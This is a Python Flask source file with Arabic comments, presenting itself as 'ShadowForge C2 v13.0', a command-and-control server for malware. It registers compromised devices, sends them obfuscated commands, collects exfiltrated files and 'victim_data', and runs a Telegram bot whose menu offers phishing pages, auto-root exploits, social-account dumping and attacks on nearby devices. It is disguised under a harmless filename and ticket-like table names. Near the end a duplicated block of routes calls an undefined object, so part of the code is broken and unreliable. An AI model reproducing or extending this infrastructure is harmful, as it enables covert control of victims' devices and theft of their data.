#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
core_service_monitor.py – خادم القيادة والتحكم المركزي (C2)
الإصدار النووي v13.0 – مزود بتشفير لكل جهاز، Dead Drops، Failover ذكي، وتشويش الأوامر
"""

import os
import base64
import json
import hashlib
import hmac
import secrets
import threading
import logging
import time
from datetime import datetime
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import telebot
from supabase import create_client

# استيراد الوحدات المخصصة (سيتم إنشاؤها لاحقاً)
from crypto_utils import CryptoManager
from connection_manager import ConnectionManager
from module_loader import ModuleLoader
from ai_obfuscator import AIObfuscator
from failover_tester import FailoverTester

# -------------------- إعدادات البيئة (Environment Variables) --------------------
app = Flask(__name__)

# المتغيرات الإجبارية
MASTER_SECRET_B64 = os.environ.get('MASTER_SECRET_B64')
if not MASTER_SECRET_B64:
    raise ValueError("MASTER_SECRET_B64 is required")
MASTER_SECRET = base64.b64decode(MASTER_SECRET_B64)

SALT = os.environ.get('SALT', 'default-salt').encode()
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    raise ValueError("ADMIN_ID is required")

# بوتات تلغرام – رئيسي واحتياطي
BOT_TOKEN = os.environ.get('BOT_TOKEN')
BACKUP_BOT_TOKENS = os.environ.get('BACKUP_BOT_TOKENS', '').split(',')

# قاعدة بيانات Supabase
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY')

# نقاط Dead Drops (روابط مشفرة لتحديث الإعدادات)
DEAD_DROP_URLS = os.environ.get('DEAD_DROP_URLS', '').split(',')

# مفتاح الوصول للبوت (مشترك مع ACCESS_KEY في العميل)
ACCESS_KEY = os.environ.get('ACCESS_KEY')

# -------------------- تهيئة المديرين --------------------
crypto = CryptoManager(MASTER_SECRET, SALT)

config = {
    'telegram': {
        'primary_token': BOT_TOKEN,
        'backup_tokens': BACKUP_BOT_TOKENS
    },
    'supabase': {
        'primary_url': SUPABASE_URL,
        'primary_key': SUPABASE_KEY
    },
    'dead_drop': {
        'urls': DEAD_DROP_URLS
    }
}

conn_mgr = ConnectionManager(config)
module_loader = ModuleLoader(crypto)
ai_obfuscator = AIObfuscator()
failover_tester = FailoverTester(conn_mgr)

# تشغيل خلفية لفحص الاتصالات (Failover)
threading.Thread(target=failover_tester.start_periodic_check, daemon=True).start()

# عميل Supabase
if SUPABASE_URL and SUPABASE_KEY:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
else:
    supabase = None

# تحديد معدل الطلبات
limiter = Limiter(get_remote_address, app=app, default_limits=["500 per day", "50 per hour"])

# إعداد السجلات
logging.basicConfig(level=logging.INFO)

# -------------------- مصادقة الأجهزة باستخدام HMAC + nonce --------------------
def authenticate_device(request):
    """
    تستخرج معلومات المصادقة من رأس الطلب وتتحقق من توقيع HMAC.
    تعيد device_id إذا نجحت المصادقة، وإلا None.
    """
    device_id = request.headers.get('X-Device-ID')
    nonce = request.headers.get('X-Nonce')
    signature = request.headers.get('X-Signature')
    if not all([device_id, nonce, signature]):
        return None

    device_key = crypto.derive_device_key(device_id)
    expected = hmac.new(
        device_key,
        f"{device_id}:{nonce}".encode(),
        hashlib.sha256
    ).hexdigest()
    return device_id if hmac.compare_digest(expected, signature) else None

# -------------------- نقاط نهاية الأجهزة (Device Endpoints) --------------------
@app.route('/v13/register', methods=['POST'])
@limiter.limit("10 per minute")
def register_device():
    """
    تسجيل جهاز جديد مع تبادل مفاتيح ECDH.
    يستقبل device_id والمفتاح العمومي للجهاز،
    ويولد مفتاحاً مشتركاً ويعيد المفتاح العمومي للخادم.
    """
    data = request.get_json()
    device_id = data.get('device_id')
    client_pub_b64 = data.get('public_key')
    if not device_id or not client_pub_b64:
        return jsonify({'error': 'Missing fields'}), 400

    # إنشاء زوج مفاتيح مؤقت للخادم
    server_priv, server_pub = crypto.generate_ephemeral_keypair()
    server_pub_b64 = base64.b64encode(server_pub.public_bytes_raw()).decode()

    client_pub_bytes = base64.b64decode(client_pub_b64)
    shared_key = crypto.compute_shared_secret(server_priv, client_pub_bytes)

    # تخزين المفتاح المشترك مع صلاحية ساعة واحدة
    app.config.setdefault('shared_keys', {})[device_id] = {
        'key': shared_key,
        'expiry': datetime.utcnow().timestamp() + 3600
    }

    # حفظ معلومات الجهاز في Supabase
    if supabase:
        supabase.table('pos_clients').upsert({
            'client_serial': device_id,
            'public_key': client_pub_b64,
            'first_seen': datetime.utcnow().isoformat(),
            'last_seen': datetime.utcnow().isoformat()
        }).execute()

    return jsonify({
        'status': 'registered',
        'server_public_key': server_pub_b64
    })

@app.route('/v13/pull', methods=['GET'])
def pull_commands():
    """
    يسحب الجهاز الأوامر المعلقة الخاصة به.
    يجب أن يرسل رؤوس المصادقة الصحيحة.
    تعيد قائمة بالأوامر المشفرة (قد تحتوي على ضوضاء عشوائية).
    """
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    key_data = app.config.get('shared_keys', {}).get(device_id)
    if not key_data or key_data['expiry'] < datetime.utcnow().timestamp():
        abort(401)

    shared_key = key_data['key']

    if not supabase:
        return jsonify([])

    # جلب الأوامر المعلقة (open)
    resp = supabase.table('service_requests') \
        .select('*') \
        .eq('target_client', device_id) \
        .eq('ticket_status', 'open') \
        .execute()
    commands = resp.data

    # تحديث حالة الأوامر إلى processing
    for cmd in commands:
        supabase.table('service_requests') \
            .update({'ticket_status': 'processing'}) \
            .eq('ticket_id', cmd['ticket_id']) \
            .execute()

    encrypted_commands = []
    for cmd in commands:
        cmd_json = json.dumps(cmd).encode()
        encrypted = crypto.encrypt_packet(shared_key, cmd_json, aad=device_id.encode())
        # إضافة ضوضاء عشوائية لإخفاء الحجم
        if len(encrypted) < 1024:
            encrypted += secrets.token_bytes(1024 - len(encrypted))
        encrypted_commands.append(base64.b64encode(encrypted).decode())

    return jsonify(encrypted_commands)

@app.route('/v13/push', methods=['POST'])
def push_data():
    """
    يستقبل البيانات (نتائج الأوامر، ملفات، تحليلات) من الجهاز.
    يجب أن يرسل رؤوس المصادقة الصحيحة.
    """
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    key_data = app.config.get('shared_keys', {}).get(device_id)
    if not key_data or key_data['expiry'] < datetime.utcnow().timestamp():
        abort(401)

    shared_key = key_data['key']
    data = request.get_json()
    encrypted_payload = data.get('payload')

    if not encrypted_payload:
        abort(400)

    try:
        decrypted = crypto.decrypt_packet(
            shared_key,
            base64.b64decode(encrypted_payload),
            aad=device_id.encode()
        )
        payload = json.loads(decrypted.decode())
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        abort(400)

    # تحديث آخر ظهور للجهاز في Supabase
    if supabase:
        supabase.table('pos_clients').update({
            'last_seen': datetime.utcnow().isoformat(),
            'victim_data': payload.get('data', {}),
            'has_root': payload.get('data', {}).get('has_root', False),
            'has_accessibility': payload.get('data', {}).get('has_accessibility', False),
            'ip_address': request.remote_addr
        }).eq('client_serial', device_id).execute()

    # معالجة أنواع الحمولات المختلفة
    payload_type = payload.get('type')

    if payload_type == 'command_result':
        cmd_id = payload.get('command_id')
        result = payload.get('result')
        success = payload.get('success', True)

        if supabase and cmd_id:
            supabase.table('service_requests').update({
                'ticket_status': 'done' if success else 'failed',
                'resolution_log': result
            }).eq('ticket_id', cmd_id).execute()

        # إشعار المشرف عبر البوت
        threading.Thread(
            target=conn_mgr.send_message_async,
            args=(ADMIN_ID, f"Result from {device_id}:\n{result[:200]}")
        ).start()

    elif payload_type == 'file':
        filename = payload.get('filename')
        filedata = base64.b64decode(payload.get('data', ''))
        if supabase:
            storage_path = f"exfil/{device_id}/{filename}"
            supabase.storage.from_('exfil').upload(storage_path, filedata)
            conn_mgr.send_message_async(
                ADMIN_ID,
                f"File from {device_id}: {filename}\n"
                f"https://supabase.co/storage/{storage_path}"
            )

    elif payload_type == 'ai_analysis':
        logging.info(f"AI analysis from {device_id}: {payload.get('data')}")

    return jsonify({'status': 'ok'})

@app.route('/v13/config', methods=['GET'])
def get_config():
    """
    يعيد للجهاز الإعدادات الحالية (قنوات الاتصال، الفترات الزمنية) مشفرة.
    """
    device_id = authenticate_device(request)
    if not device_id:
        abort(401)

    key_data = app.config.get('shared_keys', {}).get(device_id)
    if not key_data or key_data['expiry'] < datetime.utcnow().timestamp():
        abort(401)

    shared_key = key_data['key']
    current_config = conn_mgr.get_active_config()
    encrypted = crypto.encrypt_packet(
        shared_key,
        json.dumps(current_config).encode(),
        aad=device_id.encode()
    )
    return jsonify({'config': base64.b64encode(encrypted).decode()})

# -------------------- نقاط نهاية البوت (Bot API Endpoints) --------------------
@app.route('/api/clients', methods=['GET'])
def list_clients():
    """
    يعيد قائمة بالأجهزة المسجلة (للبوت).
    يتطلب رأس X-Service-Auth بقيمة ACCESS_KEY.
    """
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    if not supabase:
        return jsonify([])

    result = supabase.table('pos_clients') \
        .select('client_serial, operational_status, last_ping') \
        .execute()
    return jsonify(result.data)

@app.route('/api/command', methods=['POST'])
def create_command():
    """
    ينشئ أمراً جديداً لجهاز معين (يستخدمه البوت).
    يتطلب رأس X-Service-Auth بقيمة ACCESS_KEY.
    """
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    data = request.json
    target = data.get('target_client')
    req_type = data.get('request_type')
    req_data = data.get('request_data', '')

    if not target or not req_type:
        return jsonify({'error': 'missing fields'}), 400

    if supabase:
        supabase.table('service_requests').insert({
            'target_client': target,
            'request_type': req_type,
            'request_data': req_data,
            'ticket_status': 'open'
        }).execute()
    return jsonify({'status': 'created'})

@app.route('/api/results', methods=['GET'])
def get_results():
    """
    يعيد آخر النتائج (للبوت).
    يتطلب رأس X-Service-Auth بقيمة ACCESS_KEY.
    """
    auth = request.headers.get('X-Service-Auth')
    if not auth or not hmac.compare_digest(auth, ACCESS_KEY):
        abort(401)

    if not supabase:
        return jsonify([])

    result = supabase.table('service_requests') \
        .select('target_client, resolution_log, updated_at') \
        .neq('resolution_log', None) \
        .order('updated_at', desc=True) \
        .limit(10) \
        .execute()
    return jsonify(result.data)

# -------------------- بوت تلغرام المدمج (Telegram Bot) --------------------
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start', 'help'])
def help_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    text = """
**ShadowForge C2 v13.0 – Nuclear Edition**

**Basic:**
/list – List devices
/info [id] – Device details
/delete [id] – Remove device
/broadcast [msg] – Send to all devices
/cmd [id] [command] – Send command

**Advanced:**
/osint [email/phone] – Run OSINT (PhoneInfoga, Holehe)
/phish [url] – Create phishing page
/insta [username] – Instasploit info
/scan_network [ip_range] – Scan local network
/exploit_dell [target_ip] – Try CVE-2026-22769
/root [id] – Attempt auto-root (DirtyPipe, CVE-2025-48593)
/stream [id] – Start screen stream
/social_dump [id] – Dump social accounts from device
/nearby_pwn [id] – Attack nearby devices on same network

**AI Commands:**
/ai_analyze [id] [goal] – Analyze screen with AI
/ai_attack [id] – Plan attack with AI
/pixnapping_start [id] [app] – Start Pixnapping
/pixnapping_stop [id] – Stop Pixnapping
/ai_evolve – Generate new polymorphic version
"""
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_devices(message):
    if message.from_user.id != ADMIN_ID or not supabase:
        return
    resp = supabase.table('pos_clients') \
        .select('client_serial, last_ping, operational_status') \
        .order('last_ping', desc=True) \
        .limit(20) \
        .execute()
    devices = resp.data
    if not devices:
        bot.reply_to(message, "No devices registered.")
        return
    msg = "**Active devices:**\n"
    for d in devices:
        last = d['last_seen'][:16] if d.get('last_seen') else 'unknown'
        status = "🟢" if d.get('operational_status') == 'online' else "🔴"
        msg += f"{status} `{d['client_serial']}` last: {last}\n"
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['cmd'])
def send_command(message):
    if message.from_user.id != ADMIN_ID or not supabase:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd [device_id] [command]")
        return
    device_id, command = parts[1], parts[2]
    # تشويش الأمر باستخدام AI Obfuscator
    obfuscated = ai_obfuscator.obfuscate_command(command)
    supabase.table('service_requests').insert({
        'target_client': device_id,
        'request_type': obfuscated,
        'request_data': command,
        'ticket_status': 'open'
    }).execute()
    bot.reply_to(message, f"✅ Command `{command}` queued for `{device_id}`")

# -------------------- تشغيل الخادم --------------------
def start_bot():
    """تشغيل بوت تلغرام في خيط منفصل"""
    bot.infinity_polling()

if __name__ == '__main__':
    # بدء البوت في الخلفية
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
@app.route('/api/log-error', methods=['POST'])
def log_error():
    """تسجيل خطأ (لأغراض الدعم الفني)"""
    data = request.json
    payload = data.get('error_payload')
    if payload:
        encrypted = shield.encrypt(payload)
        supabase.table('error_logs').insert({'error_payload': encrypted}).execute()
    return jsonify({"status": "logged"})

# -------------------- نقاط النهاية للبوت (telegram) --------------------
@app.route('/api/clients', methods=['GET'])
def list_clients():
    """جلب قائمة بجميع الأجهزة (للبوت)"""
    result = supabase.table('pos_clients') \
        .select('client_serial, operational_status, last_ping') \
        .execute()
    return jsonify(result.data)

@app.route('/api/command', methods=['POST'])
def post_command():
    """إدراج أمر جديد من البوت (مهمة للجهاز)"""
    data = request.json
    if not data or 'target_client' not in data or 'request_type' not in data:
        return jsonify({"error": "missing fields"}), 400

    # يمكن تشفير request_data هنا إذا أردت
    req_data = data.get('request_data', '')

    supabase.table('service_requests').insert({
        'target_client': data['target_client'],
        'request_type': data['request_type'],
        'request_data': req_data,
        'ticket_status': 'open'
    }).execute()
    return jsonify({"status": "created", "ticket_id": "TKT-" + str(int(os.times()[4]))})

@app.route('/api/results', methods=['GET'])
def get_results():
    """جلب آخر النتائج من المهام المنجزة (للبوت)"""
    result = supabase.table('service_requests') \
        .select('target_client, resolution_log, updated_at') \
        .neq('resolution_log', None) \
        .order('updated_at', desc=True) \
        .limit(10) \
        .execute()
    # فك تشفير النتائج قبل الإرسال للبوت (اختياري)
    for item in result.data:
        if item['resolution_log']:
            try:
                item['resolution_log'] = shield.decrypt(item['resolution_log'])
            except:
                item['resolution_log'] = "[encrypted]"
    return jsonify(result.data)

# -------------------- تشغيل الخادم --------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
